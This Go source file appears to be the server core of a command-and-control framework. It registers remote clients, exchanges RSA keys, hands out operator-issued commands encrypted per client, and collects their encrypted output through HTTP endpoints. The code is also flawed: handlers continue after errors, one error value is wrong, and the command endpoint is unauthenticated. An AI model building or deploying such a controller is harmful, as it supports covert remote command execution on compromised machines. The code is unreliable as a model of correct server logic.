package core

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

var EmptyCmd = &Command{}
var EmptyOutput = &CommandOutput{}

var FAILURE_MESSAGE = gin.H{"success": false}
var SUCCESS_MESSAGE = gin.H{"success": true}

func (server *Server) ConfigServer() error {
	configFile, err := os.Open("../config.json")

	if err != nil {
		return err
	}

	decoder := json.NewDecoder(configFile)
	conf := ServerConfig{}

	dErr := decoder.Decode(&conf)

	if dErr != nil {
		return err
	}

	server.Config = conf

	return nil
}

func (server *Server) InitServer() error {
	router := gin.Default()
	config := server.Config

	server.Clients = make(map[string]Identification)
	server.IssuedCmd = EmptyCmd
	server.LastOutput = EmptyOutput

	key, err := rsa.GenerateKey(rand.Reader, 2048)

	if err != nil {
		return err
	}

	server.Security = Security{
		PrivateKey: key,
		PublicKey:  key.PublicKey,
	}

	router.POST(config.RecognitionEp, func(context *gin.Context) {
		clientIden := Identification{}

		err := context.BindJSON(&clientIden)

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		_, ok := server.Clients[clientIden.Id]

		if !ok {
			server.Clients[clientIden.Id] = clientIden
		}

		context.JSON(http.StatusOK, gin.H{"pubkey": server.Security.PublicKey})
	})

	router.GET(config.CommunicationEp, func(context *gin.Context) {
		cmdReqInfo := CommandRequest{}

		err := context.BindJSON(&cmdReqInfo)

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		foundClient := server.Clients[cmdReqInfo.Id]

		command := server.IssuedCmd

		encryptedBytes, err := rsa.EncryptOAEP(
			sha256.New(),
			rand.Reader,
			&foundClient.PublicKey,
			[]byte(command.Content),
			nil)

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		context.JSON(http.StatusOK, gin.H{"commandId": command.Id, "encryptedContent": encryptedBytes})
	})

	router.POST(config.CommunicationEp, func(context *gin.Context) {
		serverSec := server.Security

		encCmdOutput := EncryptedCommandResult{}
		err := context.BindJSON(&encCmdOutput)

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		encOutput := encCmdOutput.EncryptedOutput

		outputBytes, err := serverSec.PrivateKey.Decrypt(nil, encOutput, &rsa.OAEPOptions{Hash: crypto.SHA256})

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		server.LastOutput = &CommandOutput{
			Output: string(outputBytes),
			Id:     encCmdOutput.Id,
		}

		context.JSON(http.StatusOK, SUCCESS_MESSAGE)

	})

	router.POST(config.SendCommandEp, func(context *gin.Context) {
		sendCmdInfo := SendCommandInfo{}

		err := context.BindJSON(&sendCmdInfo)

		if err != nil {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		cmdId := uuid.New()

		server.IssuedCmd = &Command{
			Id:         cmdId.String(),
			Content:    sendCmdInfo.Command,
			ReceivedAt: time.Now(),
		}

		context.JSON(http.StatusOK, SUCCESS_MESSAGE)

	})

	router.GET(config.OutputEp, func(context *gin.Context) {
		lastOutput := server.LastOutput

		if lastOutput == EmptyOutput {
			context.JSON(http.StatusUnauthorized, FAILURE_MESSAGE)
		}

		context.JSON(http.StatusOK, gin.H{"cmdId": lastOutput.Id, "output": lastOutput.Output})
	})

	server.Router = router

	return nil
}

func (server *Server) StartServer() {
	router := server.Router
	config := server.Config

	router.Run(fmt.Sprintf("%s:%d", config.ServerHost, config.Port))
}
